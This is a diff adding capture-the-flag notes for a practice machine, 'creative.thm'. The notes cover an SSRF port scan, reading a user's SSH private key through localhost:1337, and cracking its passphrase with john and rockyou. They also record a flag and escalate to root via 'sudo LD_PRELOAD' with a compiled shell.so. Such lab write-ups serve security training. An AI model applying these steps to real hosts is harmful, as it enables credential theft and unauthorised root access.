@@ -18,8 +18,37 @@ Created a index.html file on root
 hosted with >> python -m http.server 80
 and successfully displayed the content of the html file.
 
+>> python portbrute.py     (repeats the request until different content_length found)
+Returns:
+  PORT 80
+  PORT 1337
+
+in beta.creative.thm: entered http://localhost:1337 and returned the "/" directory
+
+>> http://localhost:1337/home/saad/.ssh/id_rsa
+
+>> ssh -i id_rsa saad@creative.thm
+asked for passphrase
+
+>> ssh2john id_rsa > forjohn
+
+john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
+password: "sweetness"
+
+FLAG 1 user.txt:
+9a1ce90a7653d74ab98630b47b8b4a84
+
+found password in:
+>> cat .bash_history
+
+and entered the password >> sudo -l
+  env_keep+=LD_PRELOAD
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
 
 
+saad: /tmp$  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
+>> sudo LD_PRELOAD=/tmp/shell.so ping
 
 
